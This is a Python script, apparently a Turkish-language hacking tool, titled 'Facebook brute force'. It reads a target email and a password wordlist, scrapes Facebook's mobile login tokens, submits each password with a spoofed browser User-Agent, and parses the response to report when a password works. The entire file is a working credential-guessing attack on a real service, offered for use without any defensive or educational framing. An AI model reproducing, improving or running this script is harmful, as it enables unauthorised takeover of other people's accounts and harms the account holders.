import requests
from bs4 import BeautifulSoup

print("""
  , _ ,
 ( o o )
|'` ' `'|
|'''''''|
|\\'''//|
   ***
""")
print("XIORXA BRUTE FACEBOOK BRUTE FORCE")

email = input("[!] Email : ")
liste = input("[!] Worlist Yolu : ")

dosya = open(liste,"r")

for Password in dosya:
    Password = Password.strip()
    url = "https://m.facebook.com/login"
    a = requests.get(url)
    soup = BeautifulSoup(a.content, "html5lib")
    agent = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"}
    Payload = {
        "email":email,
        "pass":Password,
        "login":"Giriş+Yap"
    }
    Payload["lsd"] = soup.find(attrs={"name":"lsd"})["value"]
    Payload["jazoest"] = soup.find(attrs={"name":"jazoest"})["value"]
    Payload["m_ts"] = soup.find(attrs={"name":"m_ts"})["value"]
    Payload["li"] = soup.find(attrs={"name":"li"})["value"]
    Payload["try_number"] = soup.find(attrs={"name":"try_number"})["value"]
    Payload["unrecognized_tries"] = soup.find(attrs={"name":"unrecognized_tries"})["value"]
    a = requests.post(url, data=Payload,headers=agent)
    if "Şifreni mi unuttun?" in a.text:
        print("[!] Şifre Bulunamadı >>> "+Password)
    elif "Hesap Bulunamıyor" in a.text:
        print("Email Hatalı Lütfen Geçerli Bir Email Adresi Gir!")
    else:
        print("[+] Şifre Bulundu! "+Password)
        break